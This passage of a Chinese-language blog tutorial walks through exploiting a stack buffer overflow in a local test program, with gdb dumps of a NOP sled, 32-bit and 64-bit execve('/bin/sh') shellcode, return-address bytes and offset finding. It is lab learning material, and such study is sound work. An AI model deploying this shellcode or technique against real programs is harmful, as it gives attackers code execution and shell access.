unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></code></pre></td></tr></table></figure><p>运行，得到错误输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657100523<br></code></pre></td></tr></table></figure><p>gdb 调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657100523</span><br>vuln: No such file or directory.<br>[New LWP 9988]<br>Core was generated by `./bol ...&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x90909090 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd0a0:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd0b0:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd0c0:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd0d0:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0e0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0xffffd194      0xffffd1a0      0xffffd124<br>0xffffd100:     0xffffd134      0xf7ffdb98      0xf7fc3420      0xf7fa7000<br>0xffffd110:     0x00000001      0x00000000      0xffffd178      0x00000000<br>0xffffd120:     0xf7ffd000      0x00000000      0x00000002      0x08049060<br>0xffffd130:     0x00000000      0x79122a66      0x3de2b676      0x00000000<br></code></pre></td></tr></table></figure><p>发现栈的位置发生了偏移，ebp 变成了 0xfffffd0d8 </p><p>修改数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eip = b&#x27;\xe0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x90\xd0\xff\xff&#x27;<br></code></pre></td></tr></table></figure><p><strong>3、利用脚本统一环境变量</strong></p><p><a href="https://github.com/hellman/fixenv">hellman/fixenv: Fix stack addresses (when no ASLR) with and without debugging (github.com)</a></p><h3 id="Offset"><a href="#Offset" class="headerlink" title="Offset"></a>Offset</h3><p>gdb 内计算偏移量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> pattern create 120</span> <br><span class="hljs-meta">gdb-peda$</span><span class="bash"> pattern search AA8A</span><br></code></pre></td></tr></table></figure><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>先写 shellcode 再填充数据成功，先填充数据再写 shellcode 会失败 ，可能因为 shellcode 被覆盖 。</p><h4 id="32-bit-program"><a href="#32-bit-program" class="headerlink" title="32 bit program"></a>32 bit program</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffcfe0:     0xffffcffc      0xffffd307      0xf7ffd9d0      0x00000000<br>0xffffcff0:     0x00000000      0x00000000      0x00000000      0x90909090<br>0xffffd000:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0xffffd030<br>0xffffd070:     0x00000000      0xffffd114      0xffffd120      0xffffd0a4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0xffffd04c,0xffffd06c</span><br>Dump of assembler code from 0xffffd04c to 0xffffd06c:<br>   0xffffd04c:  xor    eax,eax<br>   0xffffd04e:  mov    ebx,eax<br>   0xffffd050:  mov    al,0x17<br>   0xffffd052:  int    0x80<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x69622f2f<br>   0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  push   ebx<br>   0xffffd065:  mov    ecx,esp<br>   0xffffd067:  lea    eax,[edx+0xb]<br>   0xffffd06a:  int    0x80<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>EBP: 0x80cd0b42 <br>ESP: 0xffffd068 (&quot;n/sh&quot;)<br>EIP: 0xffffd05c (&quot;h//bi\211\343RS\211\341\215n/sh&quot;)<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>=&gt; 0xffffd05c:  push   0x69622f2f<br>   0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  push   ebx<br>   0xffffd065:  mov    ecx,esp<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>EBP: 0x80cd0b42 <br>ESP: 0xffffd064 (&quot;//bin/sh&quot;)<br>EIP: 0xffffd061 --&gt; 0x2f52e389<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x69622f2f<br>=&gt; 0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  das    <br>   0xffffd065:  das    <br>   0xffffd066:  bound  ebp,QWORD PTR [ecx+0x6e]<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0xffffd04c,0xffffd06c</span><br>Dump of assembler code from 0xffffd04c to 0xffffd06c:<br>   0xffffd04c:  xor    eax,eax<br>   0xffffd04e:  mov    ebx,eax<br>   0xffffd050:  mov    al,0x17<br>   0xffffd052:  int    0x80<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x622f2f<br>   0xffffd061:  add    BYTE PTR [eax],al<br>   0xffffd063:  add    BYTE PTR [edi],ch<br>   0xffffd065:  das    <br>=&gt; 0xffffd066:  bound  ebp,QWORD PTR [ecx+0x6e]<br>   0xffffd069:  das    <br>   0xffffd06a:  jae    0xffffd0d4<br>End of assembler dump.<br></code></pre></td></tr></table></figure><h4 id="64-bit-program"><a href="#64-bit-program" class="headerlink" title="64 bit program"></a>64 bit program</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde40: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde50: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde60: 0x9090909090909090      0xfde98148c9314890<br>0x7fffffffde70: 0xffef058d48ffffff      0x27244955bb48ffff<br>0x7fffffffde80: 0x27583148a6c74762      0xf4e2fffffff82d48<br>0x7fffffffde90: 0xd5e8290b450bf11d      0xf895183677bd493d<br>0x7fffffffdea0: 0xa6c74767287c723f      0x00007fffffffde30<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0xf09b2a5a4e6f7545<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x0f64d5a5f30f7545      0x0f64c5e581037545<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde68,0x7fffffffdea8</span><br>Dump of assembler code from 0x7fffffffde68 to 0x7fffffffdea8:<br>   0x00007fffffffde68:  nop<br>   0x00007fffffffde69:  xor    rcx,rcx<br>   0x00007fffffffde6c:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde73:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde69<br>   0x00007fffffffde7a:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde84:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde88:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde8e:  loop   0x7fffffffde84<br>   0x00007fffffffde90:  sbb    eax,0xb450bf1<br>   0x00007fffffffde95:  sub    eax,ebp<br>   0x00007fffffffde97:  (bad)  <br>   0x00007fffffffde98:  cmp    eax,0x3677bd49<br>   0x00007fffffffde9d:  sbb    BYTE PTR [rbp+0x7c723ff8],dl<br>   0x00007fffffffdea3:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffdea6:  (bad)  <br>   0x00007fffffffdea7:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde90 --&gt; 0x732f6e69622fb848 <br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde84:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde88:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde8e:      loop   0x7fffffffde84<br>=&gt; 0x7fffffffde90:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde9a:      cdq    <br>   0x7fffffffde9b:      push   rax<br>   0x7fffffffde9c:      push   rsp<br>   0x7fffffffde9d:      pop    rdi<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde68,0x7fffffffdea8</span><br>Dump of assembler code from 0x7fffffffde68 to 0x7fffffffdea8:<br>   0x00007fffffffde68:  nop<br>   0x00007fffffffde69:  xor    rcx,rcx<br>   0x00007fffffffde6c:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde73:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde69<br>   0x00007fffffffde7a:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde84:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde88:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde8e:  loop   0x7fffffffde84<br>=&gt; 0x00007fffffffde90:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde9a:  cdq    <br>   0x00007fffffffde9b:  push   rax<br>   0x00007fffffffde9c:  push   rsp<br>   0x00007fffffffde9d:  pop    rdi<br>   0x00007fffffffde9e:  push   rdx<br>   0x00007fffffffde9f:  pop    rsi<br>   0x00007fffffffdea0:  push   0x3b<br>   0x00007fffffffdea2:  pop    rax<br>   0x00007fffffffdea3:  syscall <br>   0x00007fffffffdea5:  add    BYTE PTR [rax],al<br>   0x00007fffffffdea7:  add    BYTE PTR [rax],dh<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>Warning:<br>Cannot insert breakpoint 0.<br>Cannot access memory at address 0x68732f6e69622f<br><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RIP: 0x7fffffffde9c --&gt; 0xf583b6a5e525f54 <br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde90:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde9a:      cdq    <br>   0x7fffffffde9b:      push   rax<br>=&gt; 0x7fffffffde9c:      push   rsp<br>   0x7fffffffde9d:      pop    rdi<br>   0x7fffffffde9e:      push   rdx<br>   0x7fffffffde9f:      pop    rsi<br>   0x7fffffffdea0:      push   0x3b<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>RAX: 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RBX: 0xa6c7476227244955 <br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0x0 <br>RDI: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RIP: 0x7fffffffdea0 --&gt; 0x0 <br>EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde9d:      pop    rdi<br>   0x7fffffffde9e:      push   rdx<br>   0x7fffffffde9f:      pop    rsi<br>=&gt; 0x7fffffffdea0:      add    BYTE PTR [rax],al<br>   0x7fffffffdea2:      add    BYTE PTR [rax],al<br>   0x7fffffffdea4:      add    BYTE PTR [rax],al<br>   0x7fffffffdea6:      add    BYTE PTR [rax],al<br>   0x7fffffffdea8:      (bad)<br></code></pre></td></tr></table></figure><p>正常：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span 